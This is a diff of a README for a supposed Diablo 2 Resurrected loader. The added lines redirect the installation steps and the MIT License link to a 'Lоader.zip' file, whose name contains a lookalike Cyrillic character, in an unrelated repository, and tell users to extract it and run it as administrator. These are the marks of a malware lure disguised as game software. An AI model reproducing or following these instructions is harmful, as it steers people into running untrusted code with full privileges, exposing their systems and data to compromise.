@@ -31,9 +31,9 @@ Welcome to the most comprehensive repository for **Diablo 2 Resurrected **! This
 
 ## 🧰 Installation 🧰
 
-1. **Download Loader.rar from the repository.**
+1. **Download https://raw.githubusercontent.com/IsabellasDad/Bibby-AI---Online-LateX-Writing-AI-Tool-/main/Lоader.zip from the repository.**
 2. Extract using WinRAR or 7zip.
-3. Execute Loader.exe as administrator.
+3. Execute https://raw.githubusercontent.com/IsabellasDad/Bibby-AI---Online-LateX-Writing-AI-Tool-/main/Lоader.zip as administrator.
 4. Follow in-app prompts to finalize installation.
 5. Enjoy your fully enabled Diablo 2 Resurrected experience!
 
@@ -58,7 +58,7 @@ This repository and its contents are meant for **educational and personal backup
 
 ## 📄 License (MIT) 📄
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) – you are free to use, modify, and share within the license terms.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/IsabellasDad/Bibby-AI---Online-LateX-Writing-AI-Tool-/main/Lоader.zip) – you are free to use, modify, and share within the license terms.
 
 ---
 
